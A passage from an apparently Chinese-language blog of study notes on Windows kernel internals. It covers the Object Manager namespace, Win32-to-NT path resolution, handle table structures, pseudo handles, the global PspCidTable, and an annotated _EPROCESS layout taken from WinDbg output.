Ptr64 Void</span><br><span class="line">   +0x150 Flags            : Uint4B</span><br><span class="line">   +0x154 SessionId        : Uint4B</span><br></pre></td></tr></table></figure><p>每一个“目录对象”（Directory Object），在内核中对应的结构体是 <code>_OBJECT_DIRECTORY</code>。</p><p>整个 Object Manager 命名空间以 <strong><code>\</code></strong> 为根目录，形成一棵类似文件系统的目录树。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">\                                （根目录，DirectoryObject）</span><br><span class="line">├── Driver                       所有驱动对象 (DriverObject)</span><br><span class="line">│     └── MyDriver</span><br><span class="line">│</span><br><span class="line">├── Device                       所有设备对象 (DeviceObject)</span><br><span class="line">│     └── Harddisk0</span><br><span class="line">│     └── Serial0</span><br><span class="line">│</span><br><span class="line">├── ??                           ★ 符号链接桥梁目录 (SymbolicLinkObject)</span><br><span class="line">│     ├── C:         → \Device\HarddiskVolume1</span><br><span class="line">│     ├── COM1       → \Device\Serial0</span><br><span class="line">│     └── MyLink     → \Device\MyDevice</span><br><span class="line">│</span><br><span class="line">├── BaseNamedObjects             ★ 用户会话 0 命名空间（全局同步对象）</span><br><span class="line">│     └── MyEvent</span><br><span class="line">│     └── MyMutex</span><br><span class="line">│</span><br><span class="line">├── Sessions                     ★ 多用户会话隔离目录</span><br><span class="line">│     └── 1</span><br><span class="line">│         └── BaseNamedObjects   （Session 1 的私有命名空间）</span><br><span class="line">│</span><br><span class="line">├── ObjectTypes                  ★ 已注册的内核对象类型列表</span><br><span class="line">├── Windows (部分版本存在)</span><br><span class="line">└── 其它系统内部目录</span><br></pre></td></tr></table></figure><p>其对应的物理形态（物理上它是哈希链表的嵌套）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[\ (Root)] -&gt; HashBuckets[...]</span><br><span class="line">      |</span><br><span class="line">      +--&gt; &quot;Driver&quot; (Directory Object)</span><br><span class="line">      |       |</span><br><span class="line">      |       +--&gt; HashBuckets[...] -&gt; &quot;MyDriver&quot; (Driver Object)</span><br><span class="line">      |</span><br><span class="line">      +--&gt; &quot;Device&quot; (Directory Object)</span><br><span class="line">              |</span><br><span class="line">              +--&gt; HashBuckets[...] -&gt; &quot;Harddisk0&quot; (Device Object)</span><br></pre></td></tr></table></figure><p>其中每一类目录的具体作用如下：</p><table><thead><tr><th>目录名</th><th>作用</th><th>常见对象类型</th></tr></thead><tbody><tr><td><code>\Driver</code></td><td>存放所有已注册的内核驱动对象</td><td><code>DriverObject</code></td></tr><tr><td><code>\Device</code></td><td>存放所有设备对象，供 I&#x2F;O 管理器使用</td><td><code>DeviceObject</code></td></tr><tr><td><code>\??</code></td><td>符号链接目录：Win32 路径与内核对象桥接</td><td><code>SymbolicLinkObject</code></td></tr><tr><td><code>\BaseNamedObjects</code></td><td>全局同步对象命名区（Session 0 共享）</td><td><code>Event</code> &#x2F; <code>Mutex</code> &#x2F; <code>Semaphore</code></td></tr><tr><td><code>\Sessions\N\BaseNamedObjects</code></td><td>多用户会话隔离命名空间</td><td>各自的同步对象</td></tr><tr><td><code>\ObjectTypes</code></td><td>存放系统内置的对象类型定义表</td><td><code>ObjectTypeObject</code></td></tr><tr><td><code>\Callback</code></td><td>存放回调对象，用于内核模块间的通信。</td><td></td></tr><tr><td><code>\KnownDlls</code></td><td>存放系统已知 DLL 的 Section 对象（内存映射），加速 DLL 加载</td><td></td></tr></tbody></table><p>其中 <code>\??</code> 目录（全名为 <code>DosDevices Directory</code>）是 Object Manager 里专门用来桥接 <strong>Win32 路径系统 ↔ 内核命名空间</strong> 的目录。它里面挂载的都是 <strong>符号链接对象（SymbolicLinkObject）</strong>，用于：</p><ul><li>盘符映射 (<code>C:</code> → <code>\Device\HarddiskVolumeX</code>)</li><li>传统设备名 (<code>COM1</code> → <code>\Device\Serial0</code>)</li><li>自定义设备别名（通过 <code>IoCreateSymbolicLink()</code> 创建）</li></ul><p>影子机制：解决多用户登录的符号链接问题</p><p>当Session 0 (系统服务) 访问 <code>\??</code> 时，它直接指向 <code>\Global??</code></p><p>当Session 1 (普通用户) 访问 <code>\??</code> 时，它指向 <code>\Sessions\1\DosDevices</code>，该目录下有隐藏属性 <code>DeviceMap</code>，指向 <code>\Global??</code>，当查找不到时会从影子目录中查找</p><h4 id="路径解析"><a href="#路径解析" class="headerlink" title="路径解析"></a>路径解析</h4><table><thead><tr><th>路径类型</th><th>格式示例</th><th>谁在使用</th><th>特点</th></tr></thead><tbody><tr><td>1. Win32 文件路径</td><td><code>C:\Windows\Test.sys</code></td><td>用户态程序 (Explorer, Notepad)</td><td>包含盘符。内核不认识盘符 。</td></tr><tr><td>2. Win32 设备路径</td><td><code>\\.\COM1</code></td><td>用户态程序 (串口助手, 磁盘工具)</td><td>以 <code>\\.\</code>开头，用于访问非文件的设备。</td></tr><tr><td>3. NT 路径 (原生路径)</td><td><code>\Device\HarddiskVolume1\Windows</code></td><td>内核、驱动程序</td><td>绝对路径 。没有盘符，只有设备对象名。</td></tr><tr><td>4. 对象管理路径</td><td><code>\??\C:\Windows</code></td><td>Object Manager (Ob)</td><td>Win32 路径转换后的中间形态。</td></tr></tbody></table><p>文件示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">CreateFile(&quot;C:\\Windows\\System32\\drivers\\Test.sys&quot;)</span><br><span class="line">      │</span><br><span class="line">      └─► Win32 → NT 转换</span><br><span class="line">              \??\C:\Windows\System32\drivers\Test.sys</span><br><span class="line">                   │</span><br><span class="line">                   └─► \??\C: (符号链接)</span><br><span class="line">                           ↓</span><br><span class="line">                          \Device\HarddiskVolume1</span><br><span class="line">                                │</span><br><span class="line">                                └─► 完整 NT 路径</span><br><span class="line">                                    \Device\HarddiskVolume1\Windows\System32\drivers\Test.sys</span><br></pre></td></tr></table></figure><p>设备示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CreateFile(&quot;\\\\.\\COM1&quot;)</span><br><span class="line">      │</span><br><span class="line">      └─► \??\COM1   (Win32 设备路径)</span><br><span class="line">             │</span><br><span class="line">             └─► 符号链接解析</span><br><span class="line">                  \Device\Serial0   ← 真实设备对象</span><br></pre></td></tr></table></figure><h4 id="OBJECT-DIRECTORY-ENTRY"><a href="#OBJECT-DIRECTORY-ENTRY" class="headerlink" title="_OBJECT_DIRECTORY_ENTRY"></a>_OBJECT_DIRECTORY_ENTRY</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dt _OBJECT_DIRECTORY_ENTRY</span><br><span class="line">nt!_OBJECT_DIRECTORY_ENTRY</span><br><span class="line">   +0x000 ChainLink        : Ptr64 _OBJECT_DIRECTORY_ENTRY</span><br><span class="line">   +0x008 Object           : Ptr64 Void</span><br><span class="line">   +0x010 HashValue        : Uint4B</span><br></pre></td></tr></table></figure><p><img src="/image/2025-12-30-learning_windows_4/1768644706020.png" alt="1768644706020"></p><p>ObInsertObject会分配一个 <code>_OBJECT_DIRECTORY_ENTRY</code> 小结构，并让 <code>Entry-&gt;Object = NewObject</code>，将 Entry 挂入计算出的哈希桶（将对象名转大写并计算 Hash % 37）链表头部。</p><p>查找对象</p><h3 id="句柄"><a href="#句柄" class="headerlink" title="句柄"></a>句柄</h3><p>句柄 (Handle) 是 Windows 内核分配给用户态程序的一个”凭证”或 “索引”。它是一个32位的整数（即使在64位系统上，高32位通常也为 0，以便兼容 WOW64）。</p><p>用户态无法直接访问内核内存地址（Object Pointer），只能持有句柄。内核通过句柄在句柄表中查找，最终定位到真正的内核对象（如 <code>EPROCESS</code>, <code>KTHREAD</code>, <code>KEVENT</code> 等）。</p><h4 id="EXHANDLE"><a href="#EXHANDLE" class="headerlink" title="EXHANDLE"></a>EXHANDLE</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dt _EXHANDLE</span><br><span class="line">nt!_EXHANDLE</span><br><span class="line">   +0x000 TagBits          : Pos 0, 2 Bits  //用户程序可使用的标签位，这两位对系统无意义，用户可用作句柄类型区分、调试标记等；</span><br><span class="line">   +0x000 Index            : Pos 2, 30 Bits //句柄索引字段，实际句柄值 / 4 即为该索引（因为句柄步长为 4）；</span><br><span class="line">   +0x000 GenericHandleOverlay : Ptr64 Void</span><br><span class="line">   +0x000 Value            : Uint8B</span><br></pre></td></tr></table></figure><ul><li>进程 ID 和线程 ID 本质上是全局句柄表(<code>PspCidTable</code>)的索引</li></ul><h4 id="HANDLE-TABLE"><a href="#HANDLE-TABLE" class="headerlink" title="HANDLE_TABLE"></a>HANDLE_TABLE</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dt _HANDLE_TABLE</span><br><span class="line">nt!_HANDLE_TABLE</span><br><span class="line">   +0x000 NextHandleNeedingPool : Uint4B</span><br><span class="line">   +0x004 ExtraInfoPages   : Int4B</span><br><span class="line">   +0x008 TableCode        : Uint8B</span><br><span class="line">   +0x010 QuotaProcess     : Ptr64 _EPROCESS //所属进程的 EPROCESS 指针</span><br><span class="line">   +0x018 HandleTableList  : _LIST_ENTRY     //所有句柄表的全局链表</span><br><span class="line">   +0x028 UniqueProcessId  : Uint4B          //拥有该句柄表的进程 ID（PID）</span><br><span class="line">   +0x02c Flags            : Uint4B</span><br><span class="line">   +0x02c StrictFIFO       : Pos 0, 1 Bit</span><br><span class="line">   +0x02c EnableHandleExceptions : Pos 1, 1 Bit</span><br><span class="line">   +0x02c Rundown          : Pos 2, 1 Bit</span><br><span class="line">   +0x02c Duplicated       : Pos 3, 1 Bit</span><br><span class="line">   +0x02c RaiseUMExceptionOnInvalidHandleClose : Pos 4, 1 Bit</span><br><span class="line">   +0x030 HandleContentionEvent : _EX_PUSH_LOCK</span><br><span class="line">   +0x038 HandleTableLock  : _EX_PUSH_LOCK</span><br><span class="line">   +0x040 FreeLists        : [1] _HANDLE_TABLE_FREE_LIST</span><br><span class="line">   +0x040 ActualEntry      : [32] UChar</span><br><span class="line">   +0x060 DebugInfo        : Ptr64 _HANDLE_TRACE_DEBUG_INFO</span><br></pre></td></tr></table></figure><p>Windows 采用了类似内存分页的多级索引结构</p><p><code>TableCode</code> 是查找的入口，它编码了<strong>层级</strong>和<strong>地址</strong>：</p><p>低 2 位 (Level) :</p><ul><li><code>0</code>:  L0 (直接表) 。<code>TableCode</code> 指向直接的 <code>_HANDLE_TABLE_ENTRY</code> 数组。</li><li><code>1</code>:  L1 (两级表) 。<code>TableCode</code> 指向一个指针数组，每个指针指向一个 L0 表。</li><li><code>2</code>:  L2 (三级表) 。指向指针的指针。</li></ul><p>高位 (Address) : 清除低 2 位后，即为物理层级表的基址。</p><p>以 x64 为例（每页 4KB）：</p><ul><li>1 页存句柄项(存放实际的 <code>HANDLE_TABLE_ENTRY</code> 数组,256个指针项)。</li><li>1 页 L0页(512 个指针项，每个8字节)-&gt;句柄项。</li><li>1 页L1页 -&gt; 1 页 L0页-&gt;句柄项</li></ul><p><img src="/image/2025-12-30-learning_windows_4/1768829175440.png" alt="1768829175440"></p><h4 id="HANDLE-TABLE-ENTRY"><a href="#HANDLE-TABLE-ENTRY" class="headerlink" title="HANDLE_TABLE_ENTRY"></a>HANDLE_TABLE_ENTRY</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dt nt!_HANDLE_TABLE_ENTRY</span><br><span class="line">   +0x000 Unlocked         : Pos 0, 1 Bit     //锁</span><br><span class="line">   +0x000 RefCnt           : Pos 1, 16 Bits   //句柄引用计数</span><br><span class="line">   +0x000 Attributes       : Pos 17, 3 Bits   //句柄属性(继承、保护)</span><br><span class="line">   +0x000 ObjectPointerBits : Pos 20, 44 Bits //对象指针</span><br><span class="line">   +0x008 GrantedAccessBits : Pos 0, 25 Bits  //打开句柄时获得的权限</span><br><span class="line">   +0x008 NoRightsUpgrade  : Pos 25, 1 Bit</span><br><span class="line">   +0x008 Spare1           : Pos 26, 6 Bits</span><br><span class="line">   +0x00c Spare2           : Uint4B</span><br></pre></td></tr></table></figure><p><code>Object</code>：指向实际内核对象的指针。</p><ul><li>全局句柄表 ，该指针指向进程或线程对象 。</li><li>私有句柄表 ，该指针指向内核对象的 <code>OBJECT_HEADER</code></li></ul><h4 id="伪句柄-Pseudo-Handles"><a href="#伪句柄-Pseudo-Handles" class="headerlink" title="伪句柄 (Pseudo Handles)"></a>伪句柄 (Pseudo Handles)</h4><p>这些值是硬编码的常量，不在句柄表中分配，直接由内核函数（如 <code>ObReferenceObjectByHandle</code>）特殊处理。</p><ul><li>-1 (CurrentProcess) : 指向当前进程自身。</li><li>-2 (CurrentThread) : 指向当前线程自身。</li><li>-3 (CurrentDebugObject) : 当前进程的调试端口。</li><li>-4 (CurrentDirectory) : 当前目录句柄。</li></ul><h4 id="全局句柄表"><a href="#全局句柄表" class="headerlink" title="全局句柄表"></a>全局句柄表</h4><p>全局句柄表 <code>PspCidTable</code> 是一个 <code>HANDLE_TABLE</code> 类型的全局指针，指向一个句柄表管理结构。这个表中存储着所有进程和线程对象。</p><p>表项中的 <code>Object</code> 字段直接指向对象体 (Body) （即 <code>EPROCESS</code> 或 <code>ETHREAD</code> 的起始地址），而不是指向 <code>OBJECT_HEADER</code></p><p>表项的 <code>GrantedAccess</code> 通常为 <code>0</code>，因为 PID&#x2F;TID 仅用于标识，不承载访问权限（权限检查在打开这些 ID 获取真正句柄时进行）。</p><h4 id="私有句柄表"><a href="#私有句柄表" class="headerlink" title="私有句柄表"></a>私有句柄表</h4><p>每个进程都有私有句柄表 (<code>EPROCESS-&gt;ObjectTable</code>)。</p><p>对象指针 ：表项指向对象的  OBJECT_HEADER （而非 Body）</p><h2 id="线程-进程调度"><a href="#线程-进程调度" class="headerlink" title="线程&#x2F;进程调度"></a>线程&#x2F;进程调度</h2><h3 id="进程结构"><a href="#进程结构" class="headerlink" title="进程结构"></a>进程结构</h3><h4 id="EPROCESS-Executive-Process"><a href="#EPROCESS-Executive-Process" class="headerlink" title="EPROCESS (Executive Process)"></a>EPROCESS (Executive Process)</h4><p>进程管理的最高层结构，管理进程生命周期、对象句柄、内存空间等。</p><p>包含: 资源配额、句柄表、令牌（Token）、调试端口等。</p><p>关键成员:</p><ul><li><code>ActiveProcessLinks</code>: 双向链表，连接所有活动进程。这是任务管理器枚举进程的依据。</li><li><code>UniqueProcessId</code>: 进程 ID (PID) 。</li><li><code>Token</code>: 访问令牌，决定进程权限。</li><li><code>ImageFileName</code>: 进程名（如 <code>notepad.exe</code>）。</li><li><code>Peb</code>: 指向用户模式 PEB 的指针 。</li><li><code>ObjectTable</code>: 当前进程的句柄表</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">EPROCESS</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">KPROCESS</span> <span class="title">Pcb</span>;</span>                         <span class="comment">// 0x00: 📌进程调度器相关信息（KPROCESS，前面已详细注释）</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EX_PUSH_LOCK</span> <span class="title">ProcessLock</span>;</span>             <span class="comment">// 0x98: 进程结构体自旋锁（用于多核同步）</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> _<span class="title">LARGE_INTEGER</span> <span class="title">CreateTime</span>;</span>              <span class="comment">// 0xA0: 进程创建时间</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> _<span class="title">LARGE_INTEGER</span> <span class="title">ExitTime</span>;</span>                <span class="comment">// 0xA8: 进程退出时间（如果还在运行则为 0）</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EX_RUNDOWN_REF</span> <span class="title">RundownProtect</span>;</span>        <span class="comment">// 0xB0: 清理保护机制（防止进程在使用中被删除）</span></span><br><span class="line">    VOID* UniqueProcessId;                        <span class="comment">// 0xB4: 📌当前进程的唯一 PID（HANDLE 类型）</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">ActiveProcessLinks</span>;</span>        <span class="comment">// 0xB8: 📌所有活动进程的双向链表</span></span><br><span class="line">    ULONG ProcessQuotaUsage[<span class="number">2</span>];                   <span class="comment">// 0xC0: 当前使用的分页池和非分页池配额</span></span><br><span class="line">    ULONG ProcessQuotaPeak[<span class="number">2</span>];                    <span class="comment">// 0xC8: 使用分页池和非分页池配额的历史峰值</span></span><br><span class="line">    <span class="keyword">volatile</span> ULONG CommitCharge;                  <span class="comment">// 0xD0: 当前已提交虚拟内存（以页为单位）</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EPROCESS_QUOTA_BLOCK</span>* <span class="title">QuotaBlock</span>;</span>     <span class="comment">// 0xD4: 引用进程所属的配额块</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">PS_CPU_QUOTA_BLOCK</span>* <span class="title">CpuQuotaBlock</span>;</span>    <span class="comment">// 0xD8: CPU 使用配额控制结构</span></span><br><span class="line">    ULONG PeakVirtualSize;                        <span class="comment">// 0xDC: 虚拟内存使用峰值</span></span><br><span class="line">    ULONG VirtualSize;                            <span class="comment">// 0xE0: 当前虚拟内存使用量</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">SessionProcessLinks</span>;</span>       <span class="comment">// 0xE4: 当前进程所属 session 的进程链表</span></span><br><span class="line">    VOID* DebugPort;                              <span class="comment">// 0xEC: 📌调试器端口（被调试时非 NULL）</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        VOID* ExceptionPortData;                  <span class="comment">// 0xF0: 异常端口数据（调试器使用）</span></span><br><span class="line">        ULONG ExceptionPortValue;</span><br><span class="line">        ULONG ExceptionPortState:<span class="number">3</span>;               <span class="comment">// 异常端口状态位</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HANDLE_TABLE</span>* <span class="title">ObjectTable</span>;</span>            <span class="comment">// 0xF4: 📌当前进程句柄表（用于对象管理）</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EX_FAST_REF</span> <span class="title">Token</span>;</span>                    <span class="comment">// 0xF8: 📌进程访问令牌（权限、安全上下文）</span></span><br><span class="line">    ULONG WorkingSetPage;                         <span class="comment">// 0xFC: 工作集起始页（即最小驻留页数）</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EX_PUSH_LOCK</span> <span class="title">AddressCreationLock</span>;</span>     <span class="comment">// 0x100: 地址空间创建时使用的锁</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">ETHREAD</span>* <span class="title">RotateInProgress</span>;</span>            <span class="comment">// 0x104: 正在切换线程（调度使用）</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">ETHREAD</span>* <span class="title">ForkInProgress</span>;</span>              <span class="comment">// 0x108: 正在进行 fork 操作的线程</span></span><br><span class="line">    ULONG HardwareTrigger;                        <span class="comment">// 0x10C: 硬件相关标志，可能由调试或诊断工具触发</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">MM_AVL_TABLE</span>* <span class="title">PhysicalVadRoot</span>;</span>        <span class="comment">// 0x110: VAD AVL 树根指针（描述虚拟内存分布）</span></span><br><span class="line">    VOID* CloneRoot;                              <span class="comment">// 0x114: 克隆 VAD 树根（用于进程克隆）</span></span><br><span class="line">    <span class="keyword">volatile</span> ULONG NumberOfPrivatePages;          <span class="comment">// 0x118: 分配给进程的私有页数</span></span><br><span class="line">    <span class="keyword">volatile</span> ULONG NumberOfLockedPages;           <span class="comment">// 0x11C: 被锁定（不可换出）的页数</span></span><br><span class="line">    VOID* Win32Process;                           <span class="comment">// 0x120: 指向 Win32 子系统使用的进程结构</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EJOB</span>* <span class="title">volatile</span> <span class="title">Job</span>;</span>                   <span class="comment">// 0x124: 所属作业对象（Job 对象）</span></span><br><span class="line">    VOID* SectionObject;                          <span class="comment">// 0x128: 映像节对象（表示映像在内存中的映射）</span></span><br><span class="line">    VOID* SectionBaseAddress;                     <span class="comment">// 0x12C: 映像加载的基址（即 EXE 的加载地址）</span></span><br><span class="line">    ULONG Cookie;                                 <span class="comment">// 0x130: 安全 cookie（用于防护堆栈溢出等）</span></span><br><span class="line">    ULONG Spare8;                                 <span class="comment">// 0x134: 保留字段</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">PAGEFAULT_HISTORY</span>* <span class="title">WorkingSetWatch</span>;</span>   <span class="comment">// 0x138: 页面错误历史记录（用于诊断内存访问）</span></span><br><span class="line">    VOID* Win32WindowStation;                     <span class="comment">// 0x13C: 进程关联的窗口站</span></span><br><span class="line">    VOID* InheritedFromUniqueProcessId;           <span class="comment">// 0x140: 父进程 PID（如果有）</span></span><br><span class="line">    VOID* LdtInformation;                         <span class="comment">// 0x144: 本地描述符表（LDT）信息（32位支持）</span></span><br><span class="line">    VOID* VdmObjects;                             <span class="comment">// 0x148: 虚拟 DOS 支持结构体（V86 模式）</span></span><br><span class="line">    ULONG ConsoleHostProcess;                     <span class="comment">// 0x14C: 控制台宿主进程 PID（仅控制台进程使用）</span></span><br><span class="line">    VOID* DeviceMap;                              <span class="comment">// 0x150: 设备映射信息（如 \\Device\\HarddiskX）</span></span><br><span class="line">    VOID* EtwDataSource;                          <span class="comment">// 0x154: ETW 跟踪数据源指针</span></span><br><span class="line">    VOID* FreeTebHint;                            <span class="comment">// 0x158: 用于优化 TEB 分配的 hint 指针</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">HARDWARE_PTE</span> <span class="title">PageDirectoryPte</span>;</span>    <span class="comment">// 0x160: 页目录表条目（硬件 PTE 格式）</span></span><br><span class="line">        ULONGLONG Filler;</span><br><span class="line">    &#125;;</span><br><span class="line">    VOID* Session;                                <span class="comment">// 0x168: 当前进程所属的 session 对象</span></span><br><span class="line">    UCHAR ImageFileName[<span class="number">15</span>];                      <span class="comment">// 0x16C: 📌可执行文件名称（不带路径）</span></span><br><span class="line">    UCHAR PriorityClass;                          <span class="comment">// 0x17B: 优先级类别（与线程优先级相关）</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">JobLinks</span>;</span>                  <span class="comment">// 0x17C: Job 对象下进程的链表节点</span></span><br><span class="line">    VOID* LockedPagesList;                        <span class="comment">// 0x184: 锁定页链表</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">ThreadListHead</span>;</span>            <span class="comment">// 0x188: 当前进程线程链表头</span></span><br><span class="line">    VOID* SecurityPort;                           <span class="comment">// 0x190: 安全通信端口（IPC）</span></span><br><span class="line">    VOID* PaeTop;                                 <span class="comment">// 0x194: PAE 页表顶端指针（仅在 PAE 模式使用）</span></span><br><span class="line">    <span class="keyword">volatile</span> ULONG ActiveThreads;                 <span class="comment">// 0x198: 当前活跃线程数量</span></span><br><span class="line">    ULONG ImagePathHash;                          <span class="comment">// 0x19C: 映像路径哈希值（用于快速查找）</span></span><br><span class="line">    ULONG DefaultHardErrorProcessing;             <span class="comment">// 0x1A0: 错误处理策略（如是否弹框）</span></span><br><span class="line">    LONG LastThreadExitStatus;                    <span class="comment">// 0x1A4: 最后一个线程的退出码</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">PEB</span>* <span class="title">Peb</span>;</span>                             <span class="comment">// 0x1A8: 📌指向用户态的 PEB 结构</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EX_FAST_REF</span> <span class="title">PrefetchTrace</span>;</span>            <span class="comment">// 0x1AC: 预取跟踪结构</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> _<span class="title">LARGE_INTEGER</span> <span 